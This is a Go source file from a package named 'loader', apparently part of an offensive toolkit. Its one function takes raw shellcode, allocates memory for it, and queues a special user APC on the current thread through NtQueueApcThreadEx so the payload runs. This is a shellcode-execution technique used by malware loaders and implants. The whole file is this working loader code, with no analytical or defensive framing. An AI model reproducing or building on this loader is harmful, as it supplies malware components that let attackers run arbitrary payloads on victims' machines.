package loader

import (
	"fmt"
	"variant/xwindows"
)

func NtQueueApcThreadEx(shellcode []byte) error {
	addr, err := AllocMemory(shellcode)
	if err != nil {
		return err
	}

	thread, gcErr := xwindows.GetCurrentThread()
	if gcErr != nil {
		return fmt.Errorf("GetCurrentThread failed: %w", gcErr)
	}

	qaErr := xwindows.NtQueueApcThreadEx(thread, 1, addr, 0, 0, 0)
	if qaErr != nil {
		return fmt.Errorf("NtQueueApcThreadEx failed: %w", qaErr)
	}

	return nil
}
